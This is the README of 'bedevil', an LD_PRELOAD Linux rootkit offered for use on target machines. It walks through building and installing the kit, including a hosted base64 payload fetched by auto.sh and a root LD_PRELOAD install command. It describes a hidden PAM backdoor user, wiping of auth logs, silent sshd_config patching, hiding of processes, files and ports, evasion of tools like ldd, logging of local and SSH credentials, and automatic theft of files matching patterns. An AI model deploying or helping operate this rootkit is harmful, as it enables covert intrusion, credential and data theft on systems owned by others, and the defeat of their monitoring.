# bedevil-nobash

<img src=https://i.imgur.com/PyO00vy.png alt="icon" />

</br>

 * Based on my other rootkit, [vlany](https://github.com/mempodippy/vlany)
 * bedevil is designed to be more robust, faster and efficient than vlany.

## Overview
 * This is an LD_PRELOAD rootkit. Therefore, this rootkit runs in userland.
 * This is the same as the [original bdvl](https://github.com/kcaaj/bdvl/tree/master) but however this version eliminates the need for bash.
   * So naturally this repository is much different from the original.
   * The original version on the master branch will not continue to be updated.
   * Therefore updates from this day on will __only__ be in this branch.
 * During the creation of this rootkit I had some goals in mind.
   * Tidy up previously existing aspects of precursor (LD_PRELOAD) rootkits.
   * Fix outstanding issues. (from vlany)
   * Create a more manageable & _robust_ system of rootkit functionalities.
   * Working on anything in vlany just felt like a huge mess, I grew to hate this. I knew it could be better...
 * When it comes to actual rootkit dependencies, there are only a few.
   * Most will already be installed.
   * Those that aren't will be installed before rootkit installation.

<hr>

## Usage
 * This repository is extremely simple in comparison to the original.
 * Getting an installation up & running is a matter of editing your backdoor settings in `setup.py` & just few brief commands.
```
 $ make
rm -rf new_inc
python setup.py
Username: changeme
Password: px0kFNAi
Hidden port: 26871

        sh etc/ssh.sh changeme <host> 26871 # px0kFNAi

cc -std=gnu99 -Wall -Inew_inc -g0 -O0 -shared -Wl,-soname,bdvl.so.x86_64 -fPIC new_inc/bedevil.c -lc -ldl -lcrypt -lpcap -o bdvl.so.x86_64
cc -m32 -std=gnu99 -Wall -Inew_inc -g0 -O0 -shared -Wl,-soname,bdvl.so.i686 -fPIC new_inc/bedevil.c -lc -ldl -lcrypt -lpcap -o bdvl.so.i686 2>/dev/null
make: [Makefile:17: kit] Error 1 (ignored)
strip bdvl.so*
```
 * When it comes to the actual installation, you have three choices.
   * Host the result (_in this case_) `changeme.b64` file somewhere accessible from the target box & point the first variable in `auto.sh` to wherever `changeme.b64` may be.
   * On the box, when running `auto.sh` supply it a path as an argument to this file wherever it is.
   * Or with the compiled `bdvl.so.*` you can run (*as root*) `LD_PRELOAD=./bdvl.so.x86_64 sh -c './bdvinstall bdvl.so.*'` & bdvl will, well install. Of course it's vital that dependencies be present beforehand.
     * This is how `auto.sh` installs bdvl after installing dependencies.

### Example usage
 * On my own machine here, I've configured bdvl how I like & have built it.

<img src=https://i.imgur.com/TV9FXSe.png alt=building-bdvl />

 * In this example I am using `auto.sh` to grab the result (__changeme.b64__) from a _Python HTTPServer_ I've got running for this purpose.
 * The last command sent in that screenshot is once the target box is listening for my connection, as seen in the example below.

<img src=https://i.imgur.com/WinYsn2.png alt=installation-process />

 * After this finishes successfully, you will be able to log into the backdoor with the credentials specified.

<img src=https://i.imgur.com/x8GoFAC.png alt=first-backdoor-login />

## Features & configuration information
 * Listed in the table below is a very concise overview of all of the *important* functionalities that bedevil has.
 * Most can be enabled/disabled from within `setup.py` & the others in `config.h`.

| Toggle                      | Info                                                                          |
| :-------------------------- | :---------------------------------------------------------------------------- |
| __USE_PAM_BD__              | allows interactive login as a backdoor user via ssh.                          |
| __LOG_LOCAL_AUTH__          | log successful user authentications on the box.                               |
| __LOG_SSH__                 | logs login attempts from over ssh.                                            |
| __HIDE_SELF__               | hides files and processes based on rootkit magic GID.                         |
| __FORGE_MAPS__              | hides rootkit presence from process map files.                                |
| __HIDE_PORTS__              | hides ports & port ranges defined in 'hide_ports' file.                       |
| __DO_EVASIONS__             | hides rootkit presence from unsavoury processes.                              |
| __READ_GID_FROM_FILE__      | magic GID value is changeable from backdoor shell via command.                |
| __AUTO_GID_CHANGER__        | the magic GID will refresh every so often. see comments.                      |
| __HIDE_MY_ASS__             | keep track of all hidden paths created by rootkit user (for rehiding).        |
| __UNINSTALL_MY_ASS__        | paths kept track of by HIDE_MY_ASS will be recursively removed on uninstall.  |
| __HARD_PATCH_SSHD_CONFIG__  | this keeps `UsePAM` & `PasswordAuthentication` enabled, __hardmode__.         |
| __SOFT_PATCH_SSHD_CONFIG__  | not unlike the one mentioned above however is only applied for `sshd`.        |
| __ROOTKIT_BASHRC__          | the rootkit will write & lock down `.bashrc` & `.profile`.                    |
| __BACKDOOR_UTIL__           | allows access to a host of backdoor utilities. see comments.                  |
| __SET_MAGIC_ENV_UNHIDE__    | set magic env var in `./bdv unhideself` shell process.                        |
| __BACKDOOR_PKGMAN__         | safe package management access from backdoor shell.                           |
| __FILE_STEAL__              | steal specified files when opened & accessed by users.                        |
| __PATCH_DYNAMIC_LINKER__    | rootkit overwrites the original `/etc/ld.so.preload` path with a new one.     |

 * By default, all are enabled.
 * Be warned that (_this version of_) the rootkit is not designed to be used with a lot of these features disabled.
 * Irregular behaviour & general weirdness may occur otherwise.
 * I am slowly making this better. Until then I recommend keeping everything enabled...
 * __A handful of functionalities do not begin until the first backdoor login.__

<hr>

#### Backdoor utility commands
 * By hooking the execve & execvp wrappers bdvl provides rootkit-related commands from a backdoor shell, accessible by running `./bdv`.

<img src=https://i.imgur.com/2VGlU6j.png alt=available-backdoor-commands-in-bdvl />

<hr>

#### Magic GID
 * __READ_GID_FROM_FILE__ allows changing of the rootkit's magic GID whenever you like.
 * There is a command available from within the backdoor for manual changing of the rootkit's GID.
   * `./bdv changegid`
 * __AUTO_GID_CHANGER__ is more or less what it sounds like. The rootkit will refresh its magic GID __at least__ every `GID_CHANGE_MINTIME` seconds.
   * This value can be found in [`setup.py`](https://github.com/kcaaj/bdvl/blob/nobash/setup.py)
   * The rootkit will not automatically change its GID when there are still rootkit processes running.
   * Otherwise there is a pretty high chance of being discovered since previous processes left with the previous GID would be visible.
 * __HIDE_MY_ASS__ is intended to be a means of keeping track of files created, __outside of the installation directory__, by (you) the rootkit user.
   * _For the sole purpose of rehiding them all when changing magic GID, be it manually or an automatically scheduled/timed change._
   * Paths are automatically kept track of upon creation in a backdoor shell/general rootkit process.
   * The file which contains all can be found in `my_ass` within the installation directory.
     * Paths in here will be rehidden upon GID changes.
     * If you are to unhide a path after its creation (path GID = 0), it will simply be ignored when the magic GID is being changed & files are subsequently being hidden.
     * If you would like to stop a path from being automatically rehidden upon a GID change just remove the path's line.

<hr>

#### PAM backdoor
 * By hijacking libpam & libc's authentication functions, we are able to create a phantom backdoor user.
 * [`etc/ssh.sh`](https://github.com/kcaaj/bdvl/blob/nobash/etc/ssh.sh) makes logging into your PAM backdoor with your hidden port that bit easier.
 * The responsible [utmp & wtmp functions](https://github.com/kcaaj/bdvl/tree/nobash/inc/hooks/utmp) have been hooked & information that may have indicated a backdoor user on the box is no longer easily visible.
 * Additionally the functions responsible for writing authentication logs have been hooked & intercepted to totally stop any sort of logs being written upon backdoor login.
   * See these hooks, [here (syslog)](https://github.com/kcaaj/bdvl/tree/nobash/inc/hooks/syslog) & [here (pam_syslog)](https://github.com/kcaaj/bdvl/blob/nobash/inc/backdoor/pam/pam_syslog.c).
   * _If the parent process of whatever is trying to write said auth log is that of a hidden process, the function in question simply does nothing._
   * Previously in bedevil, when interacting with the PAM backdoor, a log would be written stating that a session had been opened/closed for the root user.
   * So now this is no longer the case...
 * A problem with using this is that `UsePAM` & `PasswordAuthentication` must be enabled in the sshd config.
   * bdvl presents a couple of solutions for this. Really though it presents one solution as both work the same, primarily just at different times.
   * __HARD_PATCH_SSHD_CONFIG__ will constantly make sure the `sshd_config` file stays the way it needs to, rewriting the file when changes need to be made.
   * __SOFT_PATCH_SSHD_CONFIG__ works more or less exactly the same way as above, but applies only for the `sshd` process & does not *really* touch `sshd_config`. Basically `sshd` will read what we say it should.
     * No direct file writes/changes (to `sshd_config`) are necessary for this method. The file will appear to be untouched by any external forces when doing a normal read on it.
   * See [here](https://github.com/kcaaj/bdvl/tree/nobash/inc/backdoor/sshdpatch) for more insight on how these work.
 * The rootkit's installation directory & your backdoor home directory are in two totally different & random locations.
   * I figured it was pretty important to separate the two spaces.
   * When no rootkit processes are running (_i.e.: not logged into the backdoor_) the rootkit will remove your `.bashrc` & `.profile`, that is until you log back in.
   * I have made everything easily accessible from the backdoor's home directory by plopping symlinks to everything you may need access to.
     * Not unlike `.bashrc` & `.profile` these symlinks are removed from the home directory until you log in.
 * If you aren't root straight away after logging in, just `su root`.

<hr>

#### Dynamic linker patching
 * Upon installation the rootkit will patch the dynamic linker libraries.
 * Libraries to be patched (*if they exist*) can be found in `setup.py` (__ldpaths__).
 * Both the path to overwrite (`/etc/ld.so.preload`) & the new path (__PRELOAD_FILE__ in `setup.py`) must be the same length as each other.
 * When running `./bdv uninstall` from a backdoor shell, the rootkit will revert the libraries back to having the original path. (`/etc/ld.so.preload`)
 * [See here](https://github.com/kcaaj/bdvl/blob/nobash/inc/util/install/ldpatch.c) for more on how this works.
 * Not having __PATCH_DYNAMIC_LINKER__ enabled will instruct the rootkit to just use `/etc/ld.so.preload` instead.

<hr>

#### File stealing
 * Files that will be stolen are defined in `setup.py`. (__INTERESTING_FILES__)
 * Files within directories listed in __INTERESTING_DIRECTORIES__ will also be stolen.
 * Wildcards apply to filenames within __INTERESTING_FILES__.
   * i.e.: `INTERESTING_FILES = ['*.zip', '*.rar', '*.txt', '*.db', 'backup.*']`
   * You can also specify paths & they'll also support wildcards.
 * You may want to consult the default target files & the other settings surrounding it...
 * Files already stolen will be removed at least every `FILE_CLEANSE_TIMER` seconds.
   * The default value for this is once each day.
   * Change `FILE_CLEANSE_TIMER` to `None` to disable this.
 * By default the rootkit will only steal files with a max size of `MAX_FILE_SIZE` bytes.
   * __The default limit for this value is 20mb.__
   * Set this value to `None` & the rootkit will steal target files regardless of size.
   * Memory for the contents of target files is allocated in chunks.
     * In setup.py there is `MAX_BLOCK_SIZE` & `BLOCKS_COUNT`... See the comments surrounding these values for more.
 * Target files are stolen in the user's process so we aren't weirdly modifying file access times by doing this.
 * A file referenced by something such as `rm` by a user will be stolen before being removed.
   * `rm` is just a random example. This same logic applies for anything.
 * If a file has been stolen already, it will be ignored.
   * However if there has been a change in size since the last time it was stolen, it will be re-stolen.

<hr>

#### Credential logging
 * __LOG_LOCAL_AUTH__
   * bedevil will intercept `pam_vprompt` and log successful authentications on the box.
   * Log results are available in your installation directory.
 * __LOG_SSH__
   * bedevil intercepts `read` and `write` in order to log login attempts over ssh.
   * Again, logs are available in your installation directory.

<hr>

#### Evasion & hiding

##### Port hiding
 * With bedevil installed, you can hide or unhide any ports/ranges on the box by editing the `hide_ports` file in the rootkit's installation directory.
 * Additionally, before any configuration/setup, you can define what ports/ranges will be hidden by writing them to `inc/hide_ports`.
```
$ cat hide_ports
9146
304-306
1000-1003
```
*Where a hyphen is the range delimiter...*

##### Rootkit presence
 * bedevil will hide itself from the process memory map files upon being read.
 * Reading `/proc/*/*maps`, when bedevil is installed won't reveal the kit's location.
 * __HOWEVER__, dependencies required by the rootkit will be visible. (namely, libcrypt & libssl)

##### Scary things
 * bedevil will hide from defined scary processes, paths & environment variables.
 * The list of aforementioned processes, paths & variables can be found in `setup.py`..
 * i.e.: Running `ldd`.
   * Calling `ldd` as a regular user will show an error.
   * This user's privileges do not suffice.
   * The calling process __must__ have the power to uninstall & reinstall our rootkit.
   * Running `ldd` again with sufficient privilege will show a totally clean output.
   * This is because, during the runtime of (_in this case_) `ldd` the rootkit is not installed.
   * Upon the application exiting/returning, the parent (rootkit) process of whatever just finished running reinstalls the rootkit.


<!--

RANDOM NOTES:
  having DO_EVASIONS enabled allows a 'bug' where a root user can
  uninstall the rootkit by running ldd through an infinite
  loop. i.e.: `while true; do ldd /bin/echo; done`

LINKS OF INTEREST:
 - https://pastebin.com/rZvjDzFK

asddsadsad

-->